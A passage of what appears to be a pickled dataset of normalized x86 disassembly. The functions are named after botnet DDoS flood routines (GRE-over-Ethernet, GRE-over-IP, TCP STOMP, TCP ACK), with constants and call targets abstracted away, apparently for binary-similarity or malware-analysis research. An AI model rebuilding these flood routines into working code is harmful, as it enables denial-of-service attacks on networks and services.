S'"SUB~ESP,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EAX,0\nADD~ESP,0\nRETN"'
p38
L162L
tp39
a(S'attack_gre_eth'
p40
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nMOV~AL,[ESP+0]\nMOV~[ESP+0],AL\nMOVZX~ESI,[ESP+0]\nPUSH~0\nMOV~EAX,0\nMOV~AL,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nAND~ESI,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~EBP,EAX\nADD~ESP,0\nPUSH~<STR>\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~EDX,[ESP+0]\nMOV~[ESP+0],EDX\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],CX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],AX\nMOV~EDX,[ESP+0]\nMOV~[ESP+0],DX\nMOV~ECX,EBP\nMOV~[ESP+0],CL\nMOV~[ESP+0],EBX\nMOV~[ESP+0],0\nMOV~AL,[ESP+0]\nAND~EAX,0\nMOV~[ESP+0],EAX\nTEST~EAX,EAX\nJLE~FOO\nMOV~EBX,0\nMOV~EBP,[ESP+0]\nLEA~EAX,[EBP+0]\nROR~AX,0\nMOV~[ESP+0],AX\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+EBX*4],EAX\nMOV~EAX,[ESP+0]\nMOV~EBX,[EDX+EAX*4]\nLEA~ECX,[EBX+0]\nLEA~EAX,[EBX+0]\nMOV~[ESP+0],EAX\nLEA~ESI,[EBX+0]\nLEA~EDI,[EBX+0]\nMOV~BYTEPTR[EBX],0\nMOV~DL,[ESP+0]\nMOV~[EBX+0],DL\nLEA~EAX,[EBP+0]\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~AL,[ESP+0]\nMOV~[EBX+0],AL\nADD~ESP,0\nCMP~[ESP+0],0\nJZ~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~EDX,[ESP+0]\nMOV~[EBX+0],EDX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nMOV~EDX,[ESP+0]\nMOV~EAX,[EDX+EAX*8+0]\nMOV~[EBX+0],EAX\nMOV~[ECX+0],0\nMOV~ECX,[ESP+0]\nMOV~[ECX+0],0\nMOV~AL,[ESI]\nAND~EAX,0\nOR~EAX,0\nAND~EAX,0\nOR~EAX,0\nMOV~[ESI],AL\nMOV~AL,[ESP+0]\nMOV~[ESI+0],AL\nLEA~EAX,[EBP+0]\nROR~AX,0\nMOV~[ESI+0],AX\nMOV~EAX,[ESP+0]\nNOT~EAX\nROR~AX,0\nMOV~[ESI+0],AX\nMOV~DL,[ESP+0]\nMOV~[ESI+0],DL\nCMP~[ESP+0],0\nJZ~FOO\nMOV~[ESI+0],0\nMOV~[ESI+0],0\nCALL~FOO\nMOV~[ESI+0],EAX\nCMP~[ESP+0],0\nJZ~FOO\nMOV~EAX,[EBX+0]\nMOV~[ESI+0],EAX\nJMP~FOO\nSUB~EAX,0\nNOT~EAX\nMOV~[ESI+0],EAX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EDI],AX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[EDI+0],AX\nMOV~CX,[ESP+0]\nMOV~[EDI+0],CX\nMOV~EBX,[ESP+0]\nINC~EBX\nMOV~[ESP+0],EBX\nCMP~EBX,[ESP+0]\nJL~FOO\nCMP~[ESP+0],0\nJLE~FOO\nMOV~[ESP+0],0\nMOV~EAX,0\nMOV~EDX,[ESP+0]\nMOV~EDX,[EDX+EAX*4]\nMOV~[ESP+0],EDX\nMOV~EBP,EDX\nMOV~EBX,EDX\nADD~EBX,0\nMOV~ESI,EDX\nADD~ESI,0\nMOV~EDI,EDX\nADD~EDI,0\nLEA~EAX,[EAX+EAX*2]\nMOV~ECX,[ESP+0]\nLEA~EAX,[ECX+EAX*8]\nCMP~[EAX+0],0\nJA~FOO\nMOV~EAX,[EAX+0]\nMOV~[ESP+0],EAX\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~[ESP+0],EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nMOV~EDX,[ESP+0]\nLEA~EDX,[EDX+EDX*2]\nMOV~EAX,[ESP+0]\nMOV~ECX,0\nMOV~CL,[EAX+EDX*8+0]\nMOV~EAX,[ESP+0]\nSHR~EAX,CL\nADD~EAX,[ESP+0]\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~EDX,[ESP+0]\nMOV~[EDX+0],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EBP+0],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EBP+0],AX\nSUB~EAX,0\nNOT~EAX\nMOV~[ESI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EDI],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EDI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],EAX\nJMP~FOO\nMOV~EAX,[EBP+0]\nMOV~[ESI+0],EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nSUB~ESP,0\nPUSH~0\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nLEA~EAX,[ESP+0]\nLEA~EDX,[EBX+0]\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nPUSH~EDX\nCALL~FOO\nLEA~EAX,[ESP+0]\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nLEA~EAX,[EBX+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[EBX+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~[ESP+0],0\nJZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nLEA~EAX,[EDI+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~[EBP+0],0\nSUB~ESP,0\nPUSH~0\nPUSH~EBP\nCALL~FOO\nMOV~[EBP+0],AX\nMOV~[ESI+0],0\nADD~ESP,0\nPUSH~0\nPUSH~ESI\nCALL~FOO\nMOV~[ESI+0],AX\nMOV~[EDI+0],0\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nMOV~AX,[EDI+0]\nAND~EAX,0\nPUSH~EAX\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[EDI+0],AX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nSHL~EAX,0\nMOV~ECX,[ESP+0]\nMOV~WORDPTR[EAX+ECX],0\nMOV~EDX,[EBP+0]\nMOV~[EAX+ECX+0],EDX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nMOV~[ECX+EAX*8+0],0\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nLEA~EAX,[ECX+EAX*8]\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nPUSH~0\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~EAX,[ESP+0]\nJL~FOO\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p41
L1317L
tp42
a(S'attack_gre_ip'
p43
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nMOV~AL,[ESP+0]\nMOV~[ESP+0],AL\nMOVZX~ESI,[ESP+0]\nPUSH~0\nMOV~EAX,0\nMOV~AL,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nAND~ESI,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~EBP,EAX\nADD~ESP,0\nPUSH~<STR>\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~EDX,[ESP+0]\nMOV~[ESP+0],EDX\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],CX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],AX\nMOV~EDX,[ESP+0]\nMOV~[ESP+0],DX\nMOV~ECX,EBP\nMOV~[ESP+0],CL\nMOV~[ESP+0],EBX\nMOV~[ESP+0],0\nMOV~AL,[ESP+0]\nAND~EAX,0\nMOV~[ESP+0],EAX\nTEST~EAX,EAX\nJLE~FOO\nMOV~EBX,0\nMOV~EBP,[ESP+0]\nLEA~EAX,[EBP+0]\nROR~AX,0\nMOV~[ESP+0],AX\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+EBX*4],EAX\nMOV~EAX,[ESP+0]\nMOV~ESI,[EDX+EAX*4]\nLEA~EDX,[ESI+0]\nLEA~EBX,[ESI+0]\nLEA~EDI,[ESI+0]\nMOV~BYTEPTR[ESI],0\nMOV~CL,[ESP+0]\nMOV~[ESI+0],CL\nLEA~EAX,[EBP+0]\nROR~AX,0\nMOV~[ESI+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[ESI+0],AX\nMOV~AL,[ESP+0]\nMOV~[ESI+0],AL\nADD~ESP,0\nCMP~[ESP+0],0\nJZ~FOO\nMOV~[ESI+0],0\nMOV~[ESI+0],0\nMOV~ECX,[ESP+0]\nMOV~[ESI+0],ECX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nMOV~ECX,[ESP+0]\nMOV~EAX,[ECX+EAX*8+0]\nMOV~[ESI+0],EAX\nMOV~[EDX+0],0\nMOV~AL,[EBX]\nAND~EAX,0\nOR~EAX,0\nAND~EAX,0\nOR~EAX,0\nMOV~[EBX],AL\nMOV~AL,[ESP+0]\nMOV~[EBX+0],AL\nLEA~EAX,[EBP+0]\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~EAX,[ESP+0]\nNOT~EAX\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~DL,[ESP+0]\nMOV~[EBX+0],DL\nCMP~[ESP+0],0\nJZ~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nCALL~FOO\nMOV~[EBX+0],EAX\nCMP~[ESP+0],0\nJZ~FOO\nMOV~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nJMP~FOO\nSUB~EAX,0\nNOT~EAX\nMOV~[EBX+0],EAX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EDI],AX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[EDI+0],AX\nMOV~CX,[ESP+0]\nMOV~[EDI+0],CX\nMOV~EBX,[ESP+0]\nINC~EBX\nMOV~[ESP+0],EBX\nCMP~[ESP+0],EBX\nJG~FOO\nCMP~[ESP+0],0\nJLE~FOO\nMOV~[ESP+0],0\nMOV~EAX,0\nMOV~EDX,[ESP+0]\nMOV~EBX,[EDX+EAX*4]\nMOV~EBP,EBX\nLEA~ESI,[EBX+0]\nLEA~EDI,[EBX+0]\nLEA~EAX,[EAX+EAX*2]\nMOV~ECX,[ESP+0]\nLEA~EAX,[ECX+EAX*8]\nCMP~[EAX+0],0\nJA~FOO\nMOV~EAX,[EAX+0]\nMOV~[ESP+0],EAX\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~[ESP+0],EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nMOV~EDX,[ESP+0]\nLEA~EDX,[EDX+EDX*2]\nMOV~EAX,[ESP+0]\nMOV~ECX,0\nMOV~CL,[EAX+EDX*8+0]\nMOV~EAX,[ESP+0]\nSHR~EAX,CL\nADD~EAX,[ESP+0]\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~[EBX+0],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EBP+0],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EBP+0],AX\nSUB~EAX,0\nNOT~EAX\nMOV~[ESI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EDI],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EDI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],EAX\nJMP~FOO\nMOV~EAX,[EBP+0]\nMOV~[ESI+0],EAX\nCMP~[ESP+0],0\nJZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nLEA~EAX,[EDI+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~[EBP+0],0\nSUB~ESP,0\nPUSH~0\nPUSH~EBP\nCALL~FOO\nMOV~[EBP+0],AX\nMOV~[ESI+0],0\nADD~ESP,0\nPUSH~0\nPUSH~ESI\nCALL~FOO\nMOV~[ESI+0],AX\nMOV~[EDI+0],0\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nMOV~AX,[EDI+0]\nAND~EAX,0\nPUSH~EAX\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[EDI+0],AX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nSHL~EAX,0\nMOV~EDX,[ESP+0]\nMOV~WORDPTR[EAX+EDX],0\nMOV~EDX,[EBP+0]\nMOV~ECX,[ESP+0]\nMOV~[EAX+ECX+0],EDX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nMOV~[ECX+EAX*8+0],0\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nLEA~EAX,[ECX+EAX*8]\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nPUSH~0\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nPUSH~EBX\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~EAX,[ESP+0]\nJL~FOO\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p44
L1157L
tp45
a(S'attack_tcp_stomp'
p46
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ESI,[ESP+0]\nMOV~AL,[ESP+0]\nMOV~[ESP+0],AL\nMOV~BL,[ESP+0]\nMOV~DL,AL\nAND~EDX,0\nMOV~EDI,EDX\nPUSH~0\nPUSH~EDX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],EAX\nAND~EBX,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~EDI,EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~EBP,EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],ECX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~[ESP+0],DI\nMOV~[ESP+0],0\nMOV~DL,[ESP+0]\nAND~EDX,0\nMOV~[ESP+0],EDX\nTEST~EDX,EDX\nJLE~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDI,EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nOR~AH,0\nPUSH~EAX\nPUSH~0\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],0\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nMOV~ECX,[ESP+0]\nLEA~EAX,[ECX+EAX*8]\nADD~ESP,0\nCMP~[EAX+0],0\nJA~FOO\nMOV~EBX,[EAX+0]\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nCALL~FOO\nMOV~[ESP+0],EAX\nMOV~EDX,[ESP+0]\nLEA~EDX,[EDX+EDX*2]\nMOV~EAX,[ESP+0]\nMOV~ECX,0\nMOV~CL,[EAX+EDX*8+0]\nMOV~EAX,[ESP+0]\nSHR~EAX,CL\nADD~EAX,EBX\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~[ESP+0],EAX\nJMP~FOO\nMOV~EAX,[EAX+0]\nMOV~[ESP+0],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESP+0],AX\nJMP~FOO\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[ESP+0],AX\nLEA~EAX,[ESP+0]\nSUB~ESP,0\nPUSH~0\nPUSH~EAX\nPUSH~EDI\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nMOV~[ESP+0],0\nLEA~EAX,[ESP+0]\nSUB~ESP,0\nLEA~EDX,[ESP+0]\nPUSH~EDX\nPUSH~EAX\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nMOV~ECX,[ESP+0]\nCMP~[ESP+0],ECX\nJNZ~FOO\nCMP~EAX,0\nJBE~FOO\nMOV~EDX,[ESP+0]\nMOV~[ESP+0],DX\nCMP~DX,[ESP+0]\nJNZ~FOO\nMOV~DL,[ESP+0]\nMOV~AL,DL\nAND~EAX,0\nCMP~AL,0\nJNZ~FOO\nMOV~EBX,[ESP+0]\nMOV~EDX,EBX\nSHL~EDX,0\nMOV~EAX,[ESP+0]\nMOV~[EDX+EAX],ECX\nMOV~EAX,[ESI+0]\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~ECX,[ESP+0]\nMOV~[EDX+ECX+0],EAX\nMOV~EAX,[ESI+0]\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~[EDX+ECX+0],EAX\nMOV~AX,[ESI+0]\nMOV~[EDX+ECX+0],AX\nMOV~EAX,[ESP+0]\nMOV~[EDX+ECX+0],AX\nMOV~EDX,[ESP+0]\nLEA~EBX,[EDX+EBX*4]\nSUB~ESP,0\nLEA~EAX,[EBP+0]\nPUSH~EAX\nCALL~FOO\nMOV~[EBX],EAX\nMOV~EAX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,[ECX+EAX*4]\nLEA~ESI,[EDX+0]\nMOV~BYTEPTR[EDX],0\nMOV~AL,[ESP+0]\nMOV~[EDX+0],AL\nLEA~EAX,[EBP+0]\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~CL,[ESP+0]\nMOV~[EDX+0],CL\nADD~ESP,0\nCMP~[ESP+0],0\nJZ~FOO\nMOV~[EDX+0],0\nMOV~[EDX+0],0\nMOV~EAX,<STR>\nMOV~[EDX+0],EAX\nMOV~EAX,[ESP+0]\nSHL~EAX,0\nMOV~ECX,[ESP+0]\nMOV~EAX,[EAX+ECX]\nMOV~[EDX+0],EAX\nMOV~EAX,[ESP+0]\nSHL~EAX,0\nMOV~EAX,[EAX+ECX+0]\nMOV~[ESI],AX\nMOV~EAX,[ESP+0]\nSHL~EAX,0\nMOV~AX,[EAX+ECX+0]\nMOV~[ESI+0],AX\nMOV~EAX,[ESP+0]\nSHL~EAX,0\nMOV~EAX,[EAX+ECX+0]\nMOV~[ESI+0],EAX\nMOV~EAX,[ESP+0]\nSHL~EAX,0\nMOV~EAX,[EAX+ECX+0]\nMOV~[ESI+0],EAX\nMOV~AL,[ESI+0]\nAND~EAX,0\nOR~EAX,0\nMOV~[ESI+0],AL\nOR~[ESI+0],0\nCALL~FOO\nMOV~[ESI+0],AX\nMOV~CL,[ESP+0]\nAND~ECX,0\nSHL~ECX,0\nMOV~AL,[ESI+0]\nAND~EAX,0\nMOV~DL,[ESP+0]\nAND~EDX,0\nSHL~EDX,0\nOR~EAX,ECX\nOR~EAX,EDX\nMOV~CL,[ESP+0]\nAND~ECX,0\nSHL~ECX,0\nAND~EAX,0\nMOV~DL,[ESP+0]\nAND~EDX,0\nSHL~EDX,0\nOR~EAX,ECX\nOR~EAX,EDX\nMOV~DL,[ESP+0]\nAND~EDX,0\nADD~EDX,EDX\nAND~EAX,0\nMOV~CL,[ESP+0]\nAND~ECX,0\nOR~EAX,EDX\nOR~EAX,ECX\nMOV~[ESI+0],AL\nSUB~ESP,0\nPUSH~EBP\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nTEST~DL,0\nJZ~FOO\nSUB~ESP,0\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nSUB~EAX,EBX\nADD~ESP,0\nCMP~EAX,0\nJLE~FOO\nSUB~ESP,0\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nCMP~EAX,[ESP+0]\nJL~FOO\nCMP~[ESP+0],0\nJLE~FOO\nMOV~[ESP+0],0\nMOV~EDX,0\nLEA~EAX,[EBP+0]\nROR~AX,0\nAND~EAX,0\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~EDI,[EAX+EDX*4]\nMOV~ESI,EDI\nLEA~EBX,[EDI+0]\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EDI+0],AX\nCMP~[ESP+0],0\nJZ~FOO\nSUB~ESP,0\nPUSH~EBP\nLEA~EAX,[EBX+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~[ESI+0],0\nSUB~ESP,0\nPUSH~0\nPUSH~ESI\nCALL~FOO\nMOV~[ESI+0],AX\nMOV~EDX,[ESP+0]\nSHL~EDX,0\nADD~EDX,[ESP+0]\nMOV~EAX,[EDX+0]\nLEA~ECX,[EAX+0]\nMOV~[EDX+0],ECX\nROR~AX,0\nAND~EAX,0\nMOV~[EBX+0],EAX\nMOV~EAX,[ESP+0]\nSHL~EAX,0\nMOV~EDX,[ESP+0]\nMOV~EAX,[EAX+EDX+0]\nROR~AX,0\nAND~EAX,0\nMOV~[EBX+0],EAX\nMOV~[EBX+0],0\nLEA~EAX,[EBP+0]\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[EBX+0],AX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nMOV~DX,[EBX+0]\nMOV~ECX,[ESP+0]\nMOV~[ECX+EAX*8+0],DX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nLEA~EAX,[ECX+EAX*8]\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nPUSH~0\nLEA~EAX,[EBP+0]\nPUSH~EAX\nPUSH~EDI\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EDX,[ESP+0]\nINC~EDX\nMOV~[ESP+0],EDX\nADD~ESP,0\nCMP~EDX,[ESP+0]\nJL~FOO\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p47
L1637L
tp48
a(S'attack_tcp_ack'
